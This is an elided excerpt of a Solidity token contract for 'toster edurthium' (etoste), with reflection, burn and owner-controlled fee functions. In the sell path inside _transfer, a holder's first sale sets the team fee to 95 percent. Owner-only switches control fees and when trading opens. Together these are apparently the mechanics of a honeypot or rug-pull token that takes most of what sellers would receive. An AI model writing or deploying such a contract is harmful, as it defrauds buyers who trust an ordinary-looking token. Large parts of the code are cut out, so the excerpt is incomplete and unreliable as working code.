...
contract tosterEthudium is Context, IERC20, Ownable {
    using SafeMath for uint256;
    string private constant _name = "toster edurthium";
    string private constant _symbol = "etoste";
    uint8 private constant _decimals = 9;

    mapping(address => uint256) private _rOwned;
    mapping(address => uint256) private _tOwned;    
    uint256 private constant MAX = ~uint256(0);
    uint256 private _tTotal = 5555555555555 * 10**9;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;
    uint256 public _etosteBurned;
    ...
    function releaseetoste() public onlyOwner {
        require(liquidityAdded);
        tradeAllowed = true;
    }

    function _removeAllFee() public onlyOwner() {
        if (_reflection == 0 && _teamFee == 0 && _tosterBurn == 0) return;
        _reflection = 0;
        _teamFee = 0;
        _tosterBurn = 0;
    }

    function _restoreAllFee() public onlyOwner() {
        _reflection = 5;
        _teamFee = 5;
        _tosterBurn = 5;
    }
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from != owner() && to != owner()) {
            ...
            if (!inSwap && from != uniswapV2Pair && swapEnabled) {
                require(amount <= balanceOf(uniswapV2Pair).mul(555555).div(10000000) && amount <= _maxTxAmount);
                require(sellcooldown[from] < block.timestamp);
                if(firstsell[from] + (30 minutes) < block.timestamp){
                    sellnumber[from] = 0;
                }
                if (sellnumber[from] == 0) {
                    ...
                    sellnumber[from]++;
                    sellcooldown[from] = firstsell[from] + (30 minutes);
                    _teamFee = 95;
                    _reflection = 4;
                    _tosterBurn = 1;
                }
    ...
    function setFee(uint256 multiplier) private {
        ...
        _tosterBurn = _tosterBurn.mul(multiplier);
        _teamFee = 5;        
    }
    ...
    function _transferStandard(address sender, address recipient, uint256 amount) private {
        (uint256 tAmount, uint256 tBurn) = _tosterEthBurn(amount);
    ...
    function _tosterEthBurn(uint amount) private returns (uint, uint) {  
        uint orgAmount = amount;
        uint256 currentRate = _getRate();
        uint256 tBurn = amount.mul(_tosterBurn).div(100);
        uint256 rBurn = tBurn.mul(currentRate);
        _tTotal = _tTotal.sub(tBurn);
        _rTotal = _rTotal.sub(rBurn);
        _etosteBurned = _etosteBurned.add(tBurn);
    ...
    function sendETHToFee(uint256 amount) private {
        ...
        _marketingFunds.transfer(amount.div(4));
        _developmentFunds.transfer(amount.div(4));
    }
